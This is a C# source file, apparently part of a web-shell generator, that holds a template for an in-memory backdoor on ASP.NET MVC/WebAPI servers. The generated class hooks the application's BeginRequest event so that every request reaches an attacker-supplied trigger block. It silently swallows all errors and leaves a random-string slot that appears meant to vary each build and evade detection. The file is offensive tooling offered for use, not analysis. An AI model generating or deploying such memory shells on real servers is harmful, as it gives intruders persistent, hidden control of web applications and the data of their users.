namespace NMG.Templates;

/// <summary>
/// object memory shell registrar template for MVC/WebAPI targets.
/// Requires .NET Framework 3.5+ (System.Web.Routing).
/// Inserted at position 0 in RouteTable.Routes so it matches before MVC routes.
/// </summary>
public static class EventSubscriptionTemplate
{
    public const string Source = """
        using System;
        using System.Reflection;
        using System.Text;
        using System.Web;
        

        namespace {{NAMESPACE}}
        {
            public class {{CLASSNAME}} : RouteBase
            {
        {{MEMBERS}}

                static {{CLASSNAME}}()
                {
                    try
                    {
                        {{CLASSNAME}} route = new {{CLASSNAME}}();
                        HttpContext.Current.ApplicationInstance.BeginRequest += new EventHandler(OnBegin);
                        load = true;
                    }
                    catch (Exception)
                    {
                    }
                }

                public {{CLASSNAME}}()
                {
                }

                private static void OnTrigger(HttpContext ctx)
        {
            try
            {
                {{TRIGGER_BLOCK}}
            }
            catch (Exception)
            {
            }
        }

                private static void OnBegin(object sender, EventArgs e)
        {
            try
            {
                HttpApplication app = (HttpApplication)sender;
                HttpContext ctx = app.Context;
                if (ctx == null) return;
                OnTrigger(ctx);
            }
            catch { }
        }

        {{RANDOM_STRING}}

                
            }
        }
        """;
}
